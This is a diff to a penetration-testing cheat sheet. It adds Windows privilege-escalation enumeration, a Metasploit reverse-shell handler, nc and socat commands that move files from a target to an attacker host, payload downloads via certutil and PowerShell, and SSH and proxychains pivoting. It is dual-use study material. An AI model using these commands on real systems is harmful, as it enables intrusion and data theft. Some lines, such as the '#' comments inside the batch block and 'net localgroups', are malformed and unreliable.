@@ -348,12 +348,37 @@ cat /etc/motd           # Message of the day, possibly triggered on login
 
 ### 2.2 Windows Local Privilege Escalation ###
 
-Standard commands to enumerate the system:
-```sh
-TODO
-```
+Standard commands to enumerate the system (just in case, REM = comment):
 
-Cross-compilation of C files (e.g. exploit.c) for Windows on Kali Linux
+```bat
+
+REM User information
+echo %username%         REM Current user
+net group /domain       REM List of groups on the domain
+net localgroups         REM List of local groups on the system
+net users               REM List of current local users
+net users /domain       REM List of current domain users
+net user <USERNAME>     REM Details of user <USERNAME> (e.g. Group memberships)
+whoami                  REM Current user (reliable on Windows 7+)
+whoami /groups          REM List of groups user is in (Indicates Shell Level)
+whoami /priv            REM List of privileges for current user
+
+REM System information
+hostname                                                # hostname
+systeminfo                                              # Architecture, OS build, Hotfixes etc.
+wmic qfe get Caption,Description,HotFixID,InstalledOn   # Installed hotfix information
+
+REM Network information
+arp -A                          # Dumps Address Resolution Protocol (ARP) cache
+ipconfig /all                   # Display all IP-related information
+netsh firewall show state       # Display current state of firewall
+netsh firewall show config      # Display current configuration of firewall
+
+REM Common location for passwords
+C:\sysprep\sysprep.inf
+
+
+```
 
 ### 2.3 Cross-Compilation of C/C++ Files on Kali Linux ###
 
@@ -379,7 +404,7 @@ i686-w64-mingw32-gcc exploit.c -o exploit.exe
 x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
 ```
 
-## 3 Utility Techniques ##
+## 3 Important Utility Techniques ##
 
 The following summarizes useful techniques in different scenarios.
 
@@ -473,7 +498,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=<IP> LPORT=<LISTENING PORT>
 -f ruby                     # Ruby shell-code generation (stdout)
 ```
 
-Use exploit/multi/handler to receive stageless **AND STAGED** payload connections
+For Metasploit Framework, use **exploit/multi/handler** to receive stageless **AND STAGED** payload connections:
 ```sh
 msfconsole -q -x "use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <IP>; set LPORT <LISTENING PORT: exploit;"
 ```
@@ -481,22 +506,28 @@ msfconsole -q -x "use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <I
 ### 3.2 File Transfer, Downloading and Hosting ###
 
 ```sh
-# Netcat (transfer from TARGET to ATTACKER)
-nc <ATTACKER IP> <ATTACKER LISTENING PORT> < <FILE NAME> # on TARGET
-nc -nlvp <ATTACKER LISSTENING PORT> > <FILE NAME> # On ATTACKER
+# Netcat (usually from TARGET to ATTACKER)
+nc <ATTACKER IP> <PORT> < <FILE NAME> # On TARGET
+sudo nc -nlvp <PORT> > <FILE NAME> # On ATTACKER
 
-# Socat
+# Socat (usually from TARGET TO ATTACKER)
+socat TCP4:<ATTACKER IP>:<PORT> file:<FILE NAME>,create # On TARGET
+sudo socat TCP4-LISTEN:<PORT>,fork file:<FILE NAME> # On ATTACKER
 
-# Windows certutil (on cmd.exe) for file download
+# Linux download (usually from ATTACKER to TARGET)
+wget http://<IP>:<PORT>/<REMOTE FILE>
+curl http://<IP>:<PORT>/<REMOTE FILE> --output <LOCAL FILE NAME>
+
+# Windows cmd.exe download (usually from ATTACKER to TARGET)
 certutil.exe -urlcache -split -f http://<IP>:<PORT>/<REMOTE FILE> <LOCAL FILE NAME>
 
-# Windows Powershell (on powershell.exe) for file download
+# Windows powershell.exe cmdlet download (usually from ATTACKER to TARGET)
 Invoke-WebRequest http://<IP>:<PORT>/<REMOTE FILE> -OutFile <LOCAL FILE NAME>
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/<REMOTE FILE>', '.\<LOCAL FILE NAME>')"
 
 # SMB server (via impacket) for sharing files
 impacket-smbserver -ip <SHARE HOST IP> <SHARE NAME> <SHARE ROOT FOLDER>
-# SMB server with SMBv2 Support (Error 104: Connection Reset for above)
+# Additional SMBv2 Support (If receive "Error 104: Connection Reset" for above)
 impacket-smbserver -ip <SHARE HOST IP> <SHARE NAME> <SHARE ROOT FOLDER> -smb2support
 
 # Python SimpleHTTPServer to serve files on port 80 (preferably)
@@ -515,3 +546,36 @@ searchsploit <VULNERABLE SOFTWARE>
 # File is also located at https://exploitdb.com/exploits/<EDB NUMBER>
 searchsploit -x <EDB NUMBER> > <LOCAL FILE>
 ```
+### 3.4 Port Forwarding ###
+
+**Objective**: Allow for pivoting from 1 network to another and/or manipulating a request to be received as a particular IP.
+
+```sh
+
+# Rinetd - modify /etc/rinetd.conf by adding line(s), for example:
+0.0.0.0 <LOCAL PORT> <REMOTE IP> <REMOTE PORT>
+# Restart Rinetd service to forward <LOCAL PORT> data to <REMOTE IP>:<REMOTE PORT>
+sudo service rinetd restart
+
+# SSH Local port Forwarding (Executed on <LOCAL IP>)
+# Binds <LOCAL IP>:<LOCAL PORT> to <REMOTE IP>:<REMOTE PORT>
+ssh -L -N <LOCAL IP>:<LOCAL PORT>:<REMOTE IP>:<REMOTE PORT> <USER>@<REMOTE IP>
+
+# SSH Remote Port Forwarding (Executed on <REMOTE IP>)
+# Open listener on <LOCAL IP>:<LOCAL PORT> forwarding packets to <IP>:<REMOTE PORT> on <REMOTE IP> (<IP> can be 127.0.0.1)
+ssh -N -R <LOCAL IP>:<LOCAL PORT>:<IP>:<REMOTE PORT> <USER>@<LOCAL IP>
+
+# SSH Dynamic Port Forwarding (Executed on <LOCAL IP>)
+# Tunnel incoming traffic to <REMOTE IP> via <BINDING PORT> acting as proxy
+ssh -D <BINDING PORT> <USER>@<REMOTE IP>
+
+# Proxychains-NG (v4.14) command execution for SSH dynamic port forwarding
+# Note: Set /etc/proxychains4.conf last line to "socks5 127.0.0.1 <BINDING PORT>"
+proxychains -f /etc/proxychains4.conf -q <COMMAND>
+
+# SShuttle command (user-friendly but unreliable) (Executed on <LOCAL IP>)
+# Establish connection via SSH to <REMOTE IP>:<REMOTE PORT> for accessing <SUBNET>/<MASK>
+python3 -m sshuttle -r <USER>@<REMOTE IP>:<REMOTE PORT> <SUBNET>/<MASK>
+```
+
+As an additional note, SOCKS5 proxy is on layer 5 of OSI model, supporting higher-level protocols (e.g. HTTP), as well as IPv4/6, TCP and UDP. Therefore protocols like ICMP will fail (e.g. ping / traceroute etc.) 
